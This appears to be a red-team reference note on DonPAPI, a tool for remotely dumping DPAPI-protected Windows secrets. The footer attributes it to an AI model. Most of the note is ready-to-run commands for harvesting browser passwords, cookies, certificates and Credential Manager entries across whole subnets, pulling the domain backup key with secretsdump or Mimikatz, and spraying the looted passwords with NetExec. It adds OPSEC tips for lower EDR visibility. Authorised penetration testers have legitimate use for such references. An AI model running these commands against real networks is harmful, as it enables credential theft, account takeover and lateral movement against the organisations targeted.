# DonPAPI

**Tags:** `#donpapi` `#dpapi` `#credentialdumping` `#remote` `#linux` `#postexploitation` `#windows` `#browsers` `#certificates`

Remote DPAPI pillaging from Linux — the SharpDPAPI equivalent that runs entirely from your Kali box. Connects over SMB/WMI to remotely collect and decrypt DPAPI-protected secrets: Chrome/Edge saved passwords and cookies, Windows Credential Manager, certificates, WiFi passwords, and more. No binary execution on the target.

**Source:** https://github.com/login-securite/DonPAPI
**Install:**
```bash
pip install donpapi
# or
git clone https://github.com/login-securite/DonPAPI && pip install -r requirements.txt
```

```bash
# Full dump — all collectors, auto-fetch the domain backup key (v2.x)
donpapi collect -d DOMAIN -u Administrator -p Password -t 192.168.1.10 --fetch-pvk
```

> [!warning] **This is DonPAPI v2.x (verified against the repo).** The command is **`donpapi`** (lowercase) with two subcommands — **`collect`** and **`gui`** (there is **no `show`** subcommand). Target list is `-t` (accepts IPs / ranges / CIDR / hostnames / a file / `ALL`). Collection is selected with **`-c/--collectors`** (SharpHound-style list), not per-type flags. The v1 `DonPAPI.py -t ...` syntax and the `show`/`--browsers`/`DonPAPI.db` bits from older guides are gone.

> [!note] **DonPAPI vs SharpDPAPI** — SharpDPAPI runs on the target (Windows binary). DonPAPI runs from Kali over SMB — no binary touches the target. Use DonPAPI when you have valid credentials/hash and want to pillage DPAPI secrets without any execution on the target host.

---

## Basic Usage

```bash
# Password auth — single target
donpapi collect -d DOMAIN -u Administrator -p Password -t 192.168.1.10

# Pass the Hash (LMHASH:NTHASH — leading ':' = empty LM)
donpapi collect -d DOMAIN -u Administrator -H :NTLMhash -t 192.168.1.10

# Kerberos (ccache in KRB5CCNAME)
donpapi collect -d DOMAIN -u Administrator -k --no-pass -t host.domain.local

# Multiple targets (space-separated), a file, a CIDR, or ALL (hostnames from LDAP)
donpapi collect -d DOMAIN -u Administrator -p Password -t 192.168.1.10 192.168.1.20
donpapi collect -d DOMAIN -u Administrator -p Password -t hosts.txt
donpapi collect -d DOMAIN -u Administrator -p Password -t 192.168.1.0/24
donpapi collect -d DOMAIN -u Administrator -p Password -t ALL --dc-ip 192.168.1.1

# Use LAPS to fetch the local-admin password per host instead of supplying one
donpapi collect -d DOMAIN -u Administrator -p Password -t 192.168.1.0/24 --laps Administrator
```

---

## What Gets Dumped (collectors)

Select with `-c/--collectors <name>,<name>` (default `All`). The v2 collector names:

| Collector | What's Recovered |
|---|---|
| `Chromium` | Chrome/Edge saved passwords, cookies, Chrome refresh token |
| `Firefox` | Firefox saved passwords + cookies |
| `CredMan` | Windows Credential Manager (domain creds, RDP passwords) |
| `Certificates` | User + machine certificates with private keys |
| `Vaults` | Windows Vault app-specific credentials |
| `Wifi` | PSK for saved wireless networks |
| `Files` | Interesting files (config/creds) off the host |
| `MobaXterm` / `MRemoteNG` / `RDCMan` | Saved sessions/passwords from those clients |
| `SCCM` | SCCM network-access-account / task-sequence creds |
| `VNC` | Stored VNC passwords |

DPAPI master keys are decrypted along the way (via `--fetch-pvk`/`--pvkfile`/`--pwdfile`/`--ntfile`/`--mkfile`). Remote-registry secrets (SAM/LSA/DPAPI-System) come from RemoteOps, on by default — disable with `-nr/--no-remoteops`.

---

## Targeted Collection

```bash
# Only browsers
donpapi collect -d DOMAIN -u user -p Password -t 192.168.1.10 -c Chromium,Firefox

# Only certificates
donpapi collect -d DOMAIN -u user -p Password -t 192.168.1.10 -c Certificates

# Credential Manager + Vaults + Wifi
donpapi collect -d DOMAIN -u user -p Password -t 192.168.1.10 -c CredMan,Vaults,Wifi

# Everything but skip remote-registry ops (quieter)
donpapi collect -d DOMAIN -u user -p Password -t 192.168.1.10 -c All -nr
```

---

## Output & Browsing

Loot lands in **`~/.donpapi/loot/`** (override with `-o DIRNAME`); you browse it in the web GUI — there is **no `show` command**.

```bash
# Launch the web UI to search/export secrets, cookies and certificates
donpapi gui
donpapi gui --port 9001 --basic-auth user:pass      # bind options: --bind, --port, --ssl, --basic-auth
# The certificates view generates a ready-to-run Certipy command for client-auth certs.
```

---

## Using the Domain Backup Key

If you have the domain DPAPI backup key, DonPAPI can decrypt everything without needing each user's password:

```bash
# Get domain backup key first (requires DA)
# Via secretsdump:
secretsdump.py DOMAIN/Administrator:Password@dc01.domain.local | grep -i "dpapi"

# Via Mimikatz on DC:
# lsadump::backupkeys /export  → produces ntbackup.pvk

# Easiest: let DonPAPI fetch + cache the backup key itself (dumps it off a DC if needed)
donpapi collect -d DOMAIN -u Administrator -p Password -t 192.168.1.0/24 --fetch-pvk

# Or supply a .pvk you already have (flag is --pvkfile, not --pvk)
donpapi collect -d DOMAIN -u Administrator -p Password -t 192.168.1.0/24 --pvkfile domain_backup.pvk

# Feed known secrets to unlock masterkeys without the pvk:
#   --pwdfile user:password   --ntfile user:nthash   --mkfile {GUID}:SHA1
```

---

## Through a Proxy

```bash
# Proxychains
proxychains donpapi collect --dc-ip 192.168.1.1 -d DOMAIN -u user -p Password -t 192.168.10.5
```

---

## Common Post-Collection Actions

Export secrets/cookies as CSV from the `donpapi gui` (Secrets / Cookies / Certificates screens), then:

```bash
# Turn an exported user:password CSV into a spray list and test with NetExec
awk -F',' 'NR>1{print $1":"$2}' secrets_export.csv > plaintexts.txt
netexec smb 192.168.1.0/24 -u user -p plaintexts.txt --continue-on-success

# Client-auth certificates: the GUI hands you a ready Certipy command; or use an exported .pfx
certipy auth -pfx exported_cert.pfx -dc-ip 192.168.1.1
```

---

## OPSEC Notes

- DonPAPI uses SMB to read remote files (credential blobs, master key files) — generates file access events (Event ID 4663 if object auditing enabled)
- Authentication events (4624/4648) generated on every target
- No binary execution on the target — significantly lower EDR visibility than SharpDPAPI
- Chrome `Login Data` file may be locked if browser is open on the target — DonPAPI handles this via VSS where available
- Subnet sweeps generate significant SMB traffic — use targeted single-host runs when OPSEC matters

---

> [!note] **See also** — the on-host Windows counterpart is [[Tools/Credential Dumping/SharpDPAPI|SharpDPAPI]] (same DPAPI loot, but a binary runs on the target). Recovered client-auth certs feed [[Tools/AD/Certipy|Certipy]]; `--laps` pulls from [[Tools/AD/LAPSToolkit|LAPS]]; test looted creds with [[Tools/Lateral Movement/NetExec|NetExec]].

---

*Created: 2026-03-06*
*Updated: 2026-08-27*
*Model: claude-opus-5*
